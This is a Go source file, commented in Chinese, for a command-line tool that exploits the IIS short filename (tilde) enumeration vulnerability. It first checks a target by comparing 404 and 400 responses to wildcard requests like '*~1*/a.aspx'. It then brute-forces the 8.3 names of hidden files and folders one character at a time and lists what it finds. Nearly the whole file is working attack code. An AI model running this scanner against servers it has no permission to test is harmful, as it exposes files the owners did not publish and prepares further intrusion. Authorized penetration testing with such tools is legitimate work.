package main

import (
	"flag"
	"fmt"
	"net/http"
	"strconv"
	"strings"
)

// 终端颜色
var (
	ERR     string = "[\033[1;31m✘\033[0m]"
	RIGHT   string = "[\033[1;32m✓\033[0m]"
	WARNING string = "[\033[0;38;5;214m!\033[0m]"
	YELLOW  string = "\033[1;33m"
	MAIN    string = "\033[38;5;50m"
	ORANGE  string = "\033[0;38;5;214m"
	GREEN   string = "\033[1;32m"
	BLUE    string = "\033[1;34m"
	RED     string = "\033[1;31m"
	END     string = "\033[0m"
)

// 需要遍历的字符
// todo:需要完善，根据使用者需要的字典进行追加
var TraverseChar string = `abcdefghijklmnopqrstuvwxyz0123456789_@-=`

// 版本
var version = "1.0.0"

func TagPrint() {
	tag := `
     __ ___  __________
    |  | * //  ` + "`" + ` ______\____|\   ___
    | ~|  |/   (__/  __/ _* | \ |~ / 
 |\ |  |  |\___   \ (_| (_| | |\| | ❤
 | \|_/|_/_____)  /\___\__,_|__\\ |
  \_____________3/   ver: ` + version + `  \|
`
	fmt.Println(tag)
}

// _~!@#$%^&()=-+'{}`
// _~!@$^&()=-,;'{}
// 请求
func getRequest(url, path string) int {
	requ, err := http.NewRequest(http.MethodGet, url+path, nil)
	if err != nil {
		return 0
	}
	resp, err := http.DefaultClient.Do(requ)
	if err != nil {
		return 0
	}
	defer resp.Body.Close()
	return resp.StatusCode
}

// 扫描IIS短文件名漏洞
func scannerShortFileNameVal(url string) {
	// 存放所有存在的文件
	var allsfn []string
	// 存放每个模块输出的总文件名
	var tempsfn []string
	// 获取前6个
	// 存放临时文件
	tmp := []string{""}

	// 获取第一个短文件前面的6个字符，由于要猜解6个字符，需要循环6次
	for i := 0; i < 6; i++ {
		// 将tmp赋值给temp
		temp := tmp
		// 置空tmp，获取新一轮的短文件
		tmp = []string{}
		// 循环输出上一轮合格的文件
		for _, sfn := range temp {
			// 根据合规字符循环
			for _, val := range TraverseChar {
				// 判断文件夹是否合格
				if getRequest(url, sfn+string(val)+"*~1*/a.aspx") == 404 {
					// 返回搜索结果
					fmt.Println(WARNING, sfn+string(val)+"~1")
					// 存放最后一轮的检测合格的文件名
					tmp = append(tmp, sfn+string(val))
					// 判断符合真正短文件规则的文件名
					if getRequest(url, sfn+string(val)+"~1*/a.aspx") == 404 {
						// 存放所有合格的文件名
						tempsfn = append(tempsfn, sfn+string(val))
					}
				}
			}
		}
	}
	// 获取多余，由于多余的~x，最多只有4个，所以循环4次
	// 将全部检测处理的文件存放到tmp中
	tmp = tempsfn
	// 置空获取，用于获取最新检测到的文件
	tempsfn = []string{}
	// 猜测有没有多余的短文件名，最多四个
	for i := 1; i < 5; i++ {
		for _, val := range tmp {
			// 判断符合真正短文件规则的文件名
			if getRequest(url, val+"~"+strconv.Itoa(i)+"*/a.aspx") == 404 {
				// 判定该名字是否没有后缀名，如果没有那就放到
				// 文件名虽然没有后缀，但是我们没有足够的证据判定该文件名为文件夹
				if getRequest(url, val+"*~"+strconv.Itoa(i)+"/a.aspx") == 404 {
					allsfn = append(allsfn, url+val+"~"+strconv.Itoa(i))
				}
				// 存放最后一轮的检测合格的文件名
				tempsfn = append(tempsfn, val+"*~"+strconv.Itoa(i)+".")
			}
		}
	}

	// 获取后缀，由于要猜解后三位，需要循环3次
	tmp = tempsfn
	for i := 0; i < 3; i++ {
		// 将tmp赋值给temp
		temp := tmp
		// 置空tmp，获取新一轮的短文件
		tmp = []string{}
		// 循环输出上一轮合格的文件
		for _, sfn := range temp {
			// 根据合规字符循环
			for _, val := range TraverseChar {
				// fmt.Println(url + sfn + string(val) + "/a.aspx")
				// 判断文件夹是否合格
				if getRequest(url, sfn+string(val)+"*/a.aspx") == 404 {
					// 返回搜索结果
					fmt.Println(WARNING, sfn+string(val))
					// 存放最后一轮的检测合格的文件名
					tmp = append(tmp, sfn+string(val))
					// 判断符合真正短文件规则的文件名
					if getRequest(url, sfn+string(val)+"/a.aspx") == 404 {
						// 存放所有合格的文件名
						allsfn = append(allsfn, url+strings.Replace(sfn, "*", "", -1)+string(val))
					}
				}
			}
		}
	}

	// 汇总
	fmt.Println(RIGHT, "The", url, "xx server has an IIS short file vulnerability，result：")
	for _, val := range allsfn {
		fmt.Printf(" - %s\n", val)
	}

}

func main() {
	TagPrint()
	// url
	var url string
	// 判定是否只检测漏洞，不扫描
	var check bool
	flag.StringVar(&url, "u", "", "URL")
	flag.BoolVar(&check, "c", false, "Whether to only detect vulnerabilities. (default: false)")
	// 解析命令行参数
	flag.Parse()
	// 处理url
	if url == "" || !strings.Contains(url, "http") {
		fmt.Println(ERR, "The URL format is not accurate or there is no URL!")
		flag.Usage()
		return

	}

	if url[len(url)-1] != '/' {
		url += "/"
	}

	// 验证漏洞是否存在，验证原理是：
	// 1.访问构造的某个存在的短文件名，会返回404
	// 2.访问构造的某个不存在的短文件名，会返回400，而不是404
	if !(getRequest(url, "*~1*/a.aspx") == 404 && getRequest(url, "a7c2l_p*~1*/a.aspx") != 404) {
		fmt.Println(ERR, "The", url, "server does not have an IIS short file vulnerability!")
		return
	}
	// 判定是否
	if !check {
		// 开始验证
		scannerShortFileNameVal(url)
	}
}
